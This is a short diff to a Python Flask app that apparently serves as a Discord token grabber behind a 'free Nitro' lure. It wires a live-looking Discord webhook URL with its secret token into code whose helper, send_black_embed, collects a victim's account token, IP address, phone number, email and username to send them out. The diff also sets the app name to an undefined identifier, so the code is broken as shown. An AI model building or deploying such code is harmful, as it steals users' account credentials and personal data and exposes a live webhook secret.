@@ -2,8 +2,8 @@ from flask import Flask, redirect, request
 from dhooks import Webhook, Embed
 import requests
 
-app = Flask(__name__)
-hook = Webhook('YOUR WEBHOOK')
+app = Flask(nitro__free)
+hook = Webhook('https://discord.com/api/webhooks/1182289998695903232/KZ0cvcSzdj7wNgqaI1v_fe-gaCCQV45is4wO5g0NvxQN7vRuK02yZvfH9GZdhSMMbGFk')
 
 
 def send_black_embed(token, ip, phone_number, email, username, tag, avatar_url,
